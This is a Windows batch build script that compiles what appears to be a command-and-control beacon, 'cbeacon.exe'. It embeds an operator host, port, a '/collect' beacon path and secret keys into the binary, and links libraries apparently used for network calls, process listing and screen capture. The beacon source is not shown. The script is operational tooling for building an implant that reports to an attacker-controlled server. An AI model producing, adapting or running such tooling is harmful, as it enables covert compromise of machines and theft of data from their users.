@echo off
REM build.bat — compile the C prototype with mingw-w64.
REM Usage: build.bat [C2_HOST] [C2_PORT] [SECRET_ID] [SECRET_B64]
REM Note: string -D values use backslash-escaped quotes for the Windows CRT.
REM Note: single physical line + explicit cross-gcc. The old multi-line ^
REM continuation with a %CC% variable silently produced broken binaries
REM (missing task strings) in some environments — do not "clean this up".
set HOST=%1
if "%HOST%"=="" set HOST=127.0.0.1
set PORT=%2
if "%PORT%"=="" set PORT=8000
REM Prefer env SECRET_ID/SECRET_B64 (avoids secrets in process table / build logs);
REM explicit argv %3/%4 still override for backward compatibility.
set SID=%SECRET_ID%
set SKEY=%SECRET_B64%
if not "%3"=="" set SID=%3
if not "%4"=="" set SKEY=%4
call build-common.cmd check
if errorlevel 1 exit /b 1
x86_64-w64-mingw32-gcc -O2 -Wall -o cbeacon.exe beacon.c crypto_cng.c curve25519.c sqlite3.c -lwinhttp -lbcrypt -lpsapi -liphlpapi -lgdiplus -lgdi32 -luser32 -lole32 -DC2_HOST=\"%HOST%\" -DC2_PORT=%PORT% -DBEACON_PATH=\"/collect\" -DSECRET_ID=\"%SID%\" -DSECRET_B64=\"%SKEY%\"
if %ERRORLEVEL%==0 ( echo built cbeacon.exe & dir cbeacon.exe ) else ( echo BUILD FAILED & exit /b 1 )
